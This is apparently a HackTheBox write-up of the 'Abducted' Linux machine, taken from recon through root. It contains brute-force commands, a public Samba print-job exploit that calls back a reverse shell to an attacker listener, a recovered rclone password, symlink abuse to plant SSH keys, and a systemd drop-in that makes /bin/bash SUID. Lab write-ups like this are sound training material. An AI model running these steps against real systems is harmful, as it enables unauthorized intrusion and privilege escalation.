+++
title = "Abducted - Small printer misconfiguration gets machine pwned"
date = 2026-06-15T01:38:45Z
tags = ["HTB - Medium", "Linux", "Pentesting"]
description = "Pwning the Abducted machine from HTB."
+++
## **OVERVIEW**
*Abducted* is a medium-rated Linux machine on the HackTheBox platform. Taking over the machine requires port enumeration to find a vulnerable Samba print service, command injection to get a foothold through a known CVE, lateral movement via SMB misconfigurations, and privilege escalation through a malicious systemd drop-in.  
## **RECON**
After obtaining the target machine's IP address, I ran an nmap scan to identify open TCP ports:
```bash
┌──(root㉿kali)-[/home/esteban/HackTheBox]
└─# nmap -sS -oN nmap_scan.txt 10.129.27.170 --min-rate=10000            
```
The scan revealed three open TCP ports, one for SSH and two for Samba SMB:
```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-15 12:04 PDT
Nmap scan report for 10.129.27.170
Host is up (0.14s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-06-11T07:04:18
|_  start_date: N/A
|_nbstat: NetBIOS name: ABDUCTED, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_clock-skew: 1s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.21 seconds
```
```bash                                                          
# Below is the UDP scan, which didn't reveal anything extra
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-15 12:05 PDT
Nmap scan report for 10.129.27.170
Host is up (0.13s latency).
Not shown: 993 open|filtered udp ports (no-response)
PORT      STATE  SERVICE
112/udp   closed mcidas
137/udp   open   netbios-ns
177/udp   closed xdmcp
559/udp   closed teedtap
826/udp   closed unknown
1719/udp  closed h323gatestat
49186/udp closed unknown

Nmap done: 1 IP address (1 host up) scanned in 1.04 seconds
```
With this port scan, I only saw two points of entry: **ssh** and **smb**. 

## **ENUMERATION**
I went ahead and ran the **enum4linux** tool against the target machine's IP to enumerate SMB shares and users:
```bash
┌──(root㉿kali)-[/home/esteban/HackTheBox]
└─# enum4linux 10.129.27.170
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Jun 15 12:16:26 2026

 =========================================( Target Information )=========================================                   
                                                              
Target ........... 10.129.27.170                              
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===========================( Enumerating Workgroup/Domain on 10.129.27.170 )===========================                    
                                                              
                                                              
[+] Got domain/workgroup name: WORKGROUP                      
                                                              
                                                              
 ===============================( Nbtstat Information for 10.129.27.170 )===============================                    
                                                              
Looking up status of 10.129.27.170                            
        ABDUCTED        <00> -         B <ACTIVE>  Workstation Service
        ABDUCTED        <03> -         B <ACTIVE>  Messenger Service
        ABDUCTED        <20> -         B <ACTIVE>  File Server Service
        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
        WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

        MAC Address = 00-00-00-00-00-00

 ===================================( Session Check on 10.129.27.170 )===================================                   
                                                              
                                                              
[+] Server 10.129.27.170 allows sessions using username '', password ''                                                     
                                                              
                                                              
 ================================( Getting domain SID for 10.129.27.170 )================================                   
                                                              
Domain Name: WORKGROUP                                        
Domain Sid: (NULL SID)

[+] Can't determine if host is part of domain or part of a workgroup                                                        
                                                              
                                                              
 ==================================( OS information on 10.129.27.170 )==================================                    
                                                              
                                                              
[E] Can't get OS info with smbclient                          
                                                              
                                                              
[+] Got OS info for 10.129.27.170 from srvinfo:               
        ABDUCTED       Wk Sv PrQ Unx NT SNT Hartley Group Document Services
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03


 =======================================( Users on 10.129.27.170 )=======================================                   
                                                              
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: scott    Name: Scott Mercer    Desc: 

user:[scott] rid:[0x3e8]

 =================================( Share Enumeration on 10.129.27.170 )=================================                   
                                                              
smbXcli_negprot_smb1_done: No compatible protocol selected by server.

        Sharename       Type      Comment
        ---------       ----      -------
        HP-Reception    Printer   Reception printer
        projects        Disk      Hartley Group Project Files
        transfer        Disk      Staff file transfer
        IPC$            IPC       IPC Service (Hartley Group Document Services)
Reconnecting with SMB1 for workgroup listing.
Protocol negotiation to server 10.129.27.170 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 10.129.27.170                 
                                                              
                                                              
[E] Can't understand response:                                
                                                              
NT_STATUS_NO_SUCH_FILE listing \*                             
//10.129.27.170/HP-Reception    Mapping: N/A Listing: N/A Writing: N/A                                                      
//10.129.27.170/projects        Mapping: DENIED Listing: N/A Writing: N/A                                                   
//10.129.27.170/transfer        Mapping: DENIED Listing: N/A Writing: N/A                                                   

[E] Can't understand response:                                
                                                              
NT_STATUS_CONNECTION_REFUSED listing \*                       
//10.129.27.170/IPC$    Mapping: N/A Listing: N/A Writing: N/A

 ===========================( Password Policy Information for 10.129.27.170 )===========================                    
                                                              
                                                              

[+] Attaching to 10.129.27.170 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

        [+] ABDUCTED
        [+] Builtin

[+] Password Info for Domain: ABDUCTED

        [+] Minimum password length: 5
        [+] Password history length: None
        [+] Maximum password age: 37 days 6 hours 21 minutes 
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: 37 days 6 hours 21 minutes 



[+] Retieved partial password policy with rpcclient:          
                                                              
                                                              
Password Complexity: Disabled                                 
Minimum Password Length: 5

 ======================================( Groups on 10.129.27.170 )======================================                    
                                                              
                                                              
[+] Getting builtin groups:                                   
                                                              
                                                              
[+]  Getting builtin group memberships:                       
                                                              
                                                              
[+]  Getting local groups:                                    
                                                              
                                                              
[+]  Getting local group memberships:                         
                                                              
                                                              
[+]  Getting domain groups:                                   
                                                              
                                                              
[+]  Getting domain group memberships:                        
                                                              
                                                              
 ==================( Users on 10.129.27.170 via RID cycling (RIDS: 500-550,1000-1050) )==================                   
                                                              
                                                              
[I] Found new SID:                                            
S-1-22-1                                                      

[I] Found new SID:                                            
S-1-5-32                                                      

[I] Found new SID:                                            
S-1-5-32                                                      

[I] Found new SID:                                            
S-1-5-32                                                      

[I] Found new SID:                                            
S-1-5-32                                                      

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''                                                 
                                                              
S-1-22-1-1000 Unix User\scott (Local User)                    
S-1-22-1-1001 Unix User\marcus (Local User)

```
(Apologies for the long output, I went ahead and cut off some of the unimportant stuff)  
&nbsp;  
The enumeration scan revealed the **SMB shares** on the machine, as well as the users! The shares it found were **HP-Reception**, **projects**, **transfer**, and **IPC$**. My first instinct was to begin brute-forcing into the shares from *both* users so that's exactly what I did.
```bash
nxc smb 10.129.27.170 -u scott -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding
```
```bash
nxc smb 10.129.27.170 -u marcus -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding
```
For the **scott** user, I went ahead and let my brute-force attempt run for about half an hour, but decided to stop it since it didn't look like it was getting anywhere. The **marcus** user would successfully log in no matter what the password was, given that it was a **Guest** account. Trying to access the **projects** or **transfer** share using the **marcus** account wouldn't give me access. So, I tried to switch my attack angle.  
&nbsp;  
Instead of focusing on the two **disk** shares (**projects** and **transfer**), I took a look into the **printer** share, **HP-Reception**. I accessed it using **marcus**'s guest account:  
```bash
┌──(root㉿kali)-[/home/esteban/HackTheBox]
└─# smbclient //10.129.27.170/HP-Reception -U marcus%       
Try "help" to get a list of possible commands.
smb: \> 
```
Checking the print queue for any print jobs I could extract came up short, and I wasn't able to run **posix** to execute UNIX commands. I racked my brain for a bit and began to think, if I was able to access the printer as **marcus**, which was a *Guest* account, that means the printer could be accessed by anyone!  
&nbsp;  
This was a big realization because it meant that *any unauthenticated user* on the network could send a print job to the printer. I felt like this could lead to a foothold on the machine, but I wasn't familiar with exploiting smb printers to pop a shell. So, I did some digging online.  
&nbsp;  
I ended up coming across **CVE-2026-4480**, a recently found vulnerability within the Samba printing subsystem. Essentially, it allows for **remote code execution** through unauthenticated users sending malicious print jobs. All an attacker has to do is modify the document they send to the printer to include **"|sh"** in the job description along with a payload, which gets parsed into code that the host will run. More information about the vulnerability can be found [**here**](https://www.sentinelone.com/vulnerability-database/cve-2026-4480/).  
&nbsp;  
A PoC has already been created for this vulnerability, which already comes configured to pop a reverse shell. The Python script to run it can be found on **TheCyberGeek**'s GitHub ([**here**](https://github.com/TheCyberGeek/CVE-2026-4480-PoC)'s a link to that if you'd like to check it out!)  
&nbsp;  
I went ahead and downloaded the exploit, installed the dependencies required, set up a listener, and ran it on my attacker machine:
```bash
# Setting up a listener
┌──(root㉿kali)-[/home/esteban/HackTheBox]
└─# nc -lvnp 4444
listening on [any] 4444 ...
```
```bash
# Running the exploit
┌──(root㉿kali)-[/home/esteban/HackTheBox]
└─# python3 exploit.py 10.129.27.170 10.10.16.192 4444
[*] target   : 10.129.27.170 (\\10.129.27.170\HP-Reception)
[*] callback : 10.10.16.192:4444  (start a listener first: nc -lvnp 4444)
[+] print job submitted -- check your listener / out-of-band channel
```
Now, just gotta check our listener to see if we got a-
## **FOOTHOLD**
```bash
# Success! Shell has been caught
┌──(root㉿kali)-[/home/esteban/HackTheBox]
└─# nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.16.192] from (UNKNOWN) [10.129.27.170] 52264
bash: cannot set terminal process group (2294): Inappropriate ioctl for device
bash: no job control in this shell
nobody@abducted:/var/spool/samba$ whoami
whoami
nobody
```
I cleaned up the shell to look all nice and pretty and got straight to enumerating again. I was able to print the **/etc/passwd** file which allowed me to see what users existed on the machine:  
```bash
nobody@abducted:/var/spool/samba$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
scott:x:1000:1001:Scott Mercer:/home/scott:/bin/bash
marcus:x:1001:1002:Marcus Vale:/home/marcus:/bin/bash
```
The machine had the same two users, **marcus** and **scott**. As you can tell by the code above, I was running as the user **nobody**. This user is pretty *low-privileged*, and has no login by default, so I wasn't expecting any SUID binaries or capabilities. What I was *really* interested in was finding any configuration files, credentials, or scripts that I could run.  
&nbsp;  
It didn't take too much time to find the **/opt/offsite-backup** directory, which contained two very interesting files:  
```bash
nobody@abducted:/opt/offsite-backup$ ls
rclone.conf  sync.sh
```
The **sync.sh** file revealed the location of the **smb** shares on the local machine:  
```bash
nobody@abducted:/opt/offsite-backup$ cat sync.sh 
#!/bin/bash
/usr/bin/rclone --config /opt/offsite-backup/rclone.conf sync /srv/projects offsite:projects
```
Trying to access the **projects** share as the **nobody** user left me with a "permission denied" message. I *was* able to read the **transfers** share, though, it was empty... But I *really* struck gold with the **rclone.conf** file as it contained some old credentials:
```bash
nobody@abducted:/opt/offsite-backup$ cat rclone.conf 
[offsite]
type = sftp
host = backup.hartley-group.internal
user = svc-backup
pass = HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
shell_type = unix
```
I took the password from the configuration file and used the **rclone reveal** command to retrieve it:  
```bash
nobody@abducted:/opt/offsite-backup$ rclone reveal HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
iXzvcib3SrpZ
```
Boom. We found what we were looking for, a **password**! I went ahead and tried it with both **marcus** and **scott**, and was able to use it to SSH into **scott**'s account:
```bash
┌──(root㉿kali)-[/home/esteban/HackTheBox]
└─# ssh scott@10.129.27.170                           
scott@10.129.27.170's password: 
scott@abducted:~$ 
```
Alright, now that we got a shell open as **scott**, we have some more leverage. The **user.txt** flag was located in his home directory **/home/scott**: 
```bash
scott@abducted:~$ cat user.txt
92ff4699a085c8f6762e80f5893e952e
```
Now that we got that out the way, I had to privesc. I did some more manual enumeration just to check if the user was capable of anything, but sadly nothing special. I also didn't have access to **marcus**'s home folder, which led me to believe that I'd need to move *laterally* before going root.  
&nbsp;  
From the **scott** user, I finally had access to the **projects** smb share in the **/srv** directory! However, the files in it were NOT as interesting as I had hoped... there was only a *single* README file.
```bash
scott@abducted:/srv/projects$ ls
README.txt
scott@abducted:/srv/projects$ cat README.txt 
Hartley Group - internal project store
```
Yeah... just a tiny message telling me what the share was for...  
&nbsp;  
This wasn't the end though, I had some traction now with **scott**'s account, with *write access* to all smb shares.  
&nbsp;  
I figured I'd take a look into **marcus**'s groups to see if he was a part of anything that **scott** wasn't.  
```bash
scott@abducted:/srv/projects$ groups marcus
marcus : marcus operators
```
This was different than **scott**, as **marcus** was a part of the **operators** group. Curious, I tried to find what exactly this group allowed him to do that I couldn't:  
```bash
scott@abducted:/srv/projects$ find / -group operators 2>/dev/null
/etc/systemd/system/smbd.service.d
```
There it is. The **operators** group that **marcus** is in allows him control over the systemd **Samba** service! Though I couldn't access the **smbd.service.d** directory from **scott**, I *was* able to see the contents of the **Samba configuration** in **/etc/samba/**:  
```bash
scott@abducted:/etc/samba$ cat smb.conf
[global]
   workgroup = WORKGROUP
   server string = Hartley Group Document Services
   netbios name = ABDUCTED
   map to guest = Bad User
   guest account = nobody
   security = user
   printing = sysv
   load printers = no
   disable spoolss = no
   unix extensions = no
   allow insecure wide links = yes
   log level = 0
   include = /etc/samba/shares.conf
scott@abducted:/etc/samba$ cat shares.conf 
[HP-Reception]
   comment = Reception printer
   path = /var/spool/samba
   printable = yes
   guest ok = yes
   print command = /usr/local/bin/printaudit %J %s
   lpq command = /bin/true
   lprm command = /bin/true

[projects]
   comment = Hartley Group Project Files
   path = /srv/projects
   valid users = scott
   read only = no
   browseable = yes

[transfer]
   comment = Staff file transfer
   path = /srv/transfer
   valid users = scott
   force user = marcus
   read only = no
   wide links = yes
   browseable = yes
```
The contents of **shares.conf** were especially useful, as it revealed that filesystem of the **transfer** share would be ran as **marcus**. This meant that whatever I uploaded into **transfer** as **scott** would run commands as **marcus**.  
&nbsp;  
With this knowledge, I went back into the **transfer** share as **scott** and created a **symlink** pointing to **marcus**'s home directory. Since I wasn't able to access it as my current user, creating a symlink in the transfer share and *then* trying to open it through **smb** should allow me access!  
```bash
scott@abducted:/srv/transfer$ ln -s /home/marcus marcus_home
scott@abducted:/srv/transfer$ ls
marcus_home
```
Link created. All I had to do now was open another terminal on my attacker machine and use **smbclient** to open it up:  
```bash
┌──(root㉿kali)-[/home/esteban/HackTheBox]
└─# smbclient //10.129.27.170/transfer -U scott%iXzvcib3SrpZ
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon Jun 15 16:03:58 2026
  ..                                  D        0  Mon Jun 15 16:03:58 2026
  marcus_home                         D        0  Thu Jun  4 06:47:57 2026

                5768764 blocks of size 1024. 2301768 blocks available
smb: \> cd marcus_home\
smb: \marcus_home\> ls
  .                                   D        0  Thu Jun  4 06:47:57 2026
  ..                                  D        0  Thu Jun  4 06:41:30 2026
  .profile                            H      807  Sun Mar 31 01:41:03 2024
  .bash_logout                        H      220  Sun Mar 31 01:41:03 2024
  .bash_history                       H        0  Thu Jun  4 06:47:57 2026
  .bashrc                             H     3771  Sun Mar 31 01:41:03 2024
  .cache                             DH        0  Thu Jun  4 06:41:30 2026

                5768764 blocks of size 1024. 2301768 blocks available
```
Boom! I successfully had control over **marcus**'s home directory, running as him!  
&nbsp;  
To give myself **ssh** access, I went ahead and created a **.ssh** folder through smbclient and added my attacker machine's **id_rsa.pub** key in **authorized_keys**:  
```bash
smb: \marcus_home\> mkdir .ssh
smb: \marcus_home\> cd .ssh
smb: \marcus_home\.ssh\> put /root/.ssh/id_rsa.pub authorized_hosts
putting file /root/.ssh/id_rsa.pub as \marcus_home\.ssh\authorized_hosts (1.3 kB/s) (average 1.3 kB/s)
```
Now, I was able to **ssh** into the machine as **marcus** with no password necessary:
```bash
┌──(root㉿kali)-[/home/esteban/HackTheBox]
└─# ssh marcus@10.129.27.170
marcus@abducted:~$ 
```
Success, I finally got access to the **marcus** user! I changed directories into the Samba daemon that the **operators** group had access to:
```bash
marcus@abducted:~$ cd /etc/systemd/system/smbd.service.d/
marcus@abducted:/etc/systemd/system/smbd.service.d$ ls -la
total 8
drwxrws---  2 root operators 4096 Jun  4 13:41 .
drwxr-xr-x 26 root root      4096 Jun  4 13:41 ..
```
Being able to write to this directory meant that I'd be able to add a **malicious drop-in** configuration to be ran upon the **smbd** service starting. Since the service ran as root, that meant that I'd be able to escalate my current shell into a **root** shell with the right configuration.  
&nbsp;  
I created a **payload.conf** file to be used and placed it into the **smbd.service.d** directory, which runs upon starting up **Samba**:  
```bash
marcus@abducted:/etc/systemd/system/smbd.service.d$ ls
payload.conf
marcus@abducted:/etc/systemd/system/smbd.service.d$ cat payload.conf 
[Service]
ExecStartPre=/bin/bash -c 'chmod +s /bin/bash'
```
Essentially, when the system starts the **Samba daemon**, the **ExecStartPre** command instructs **systemd** to make **/bin/bash** an SUID executable. All I had to do after placing the configuration file in was restart the **smbd** service, check its status to make sure the configuration worked, and initialize a shell with the SUID bit set:
## **PRIVESC**
```bash
marcus@abducted:/etc/systemd/system/smbd.service.d$ systemctl restart smbd
marcus@abducted:/etc/systemd/system/smbd.service.d$ systemctl status smbd
● smbd.service - Samba SMB Daemon
     Loaded: loaded (/usr/lib/systemd/system/smbd.service; en>
    Drop-In: /etc/systemd/system/smbd.service.d
             └─payload.conf
     Active: active (running) since Mon 2026-06-15 23:31:26 U>
       Docs: man:smbd(8)
             man:samba(7)
             man:smb.conf(5)
    Process: 2929 ExecCondition=/usr/share/samba/is-configure>
    Process: 2932 ExecStartPre=/bin/bash -c chmod +s /bin/bas>
   Main PID: 2935 (smbd)
     Status: "smbd: ready to serve connections..."
      Tasks: 3 (limit: 4603)
     Memory: 7.5M (peak: 7.8M)
        CPU: 82ms
     CGroup: /system.slice/smbd.service
             ├─2935 /usr/sbin/smbd --foreground --no-process->
marcus@abducted:/etc/systemd/system/smbd.service.d$ /bin/bash -p
bash-5.2# whoami
root
bash-5.2# 
```
Finally, we've got **root**. I grabbed the **root.txt** flag located in **/root** and called it a day:
```bash
bash-5.2# cat root.txt
bb2ebf7e1fea768b5b5c5f9cea65303b
```
## **TAKEAWAYS**
This machine made me realize how fast a small misconfiguration can evolve into something much greater. To get root access after starting from nothing but a Samba printing subsystem shows how unsecure code sanitization can quite literally turn an *inch* into a *mile*. A simple printer share was enough to get a foothold on the machine!  
&nbsp;  
Thanks to reused credentials, I was able to ssh as **scott** (a good reminder to never reuse passwords). It was also a lot of fun performing lateral movement to the **marcus** user and gaining root access through a systemd service. All in all, this box was very educational and fun to hack. 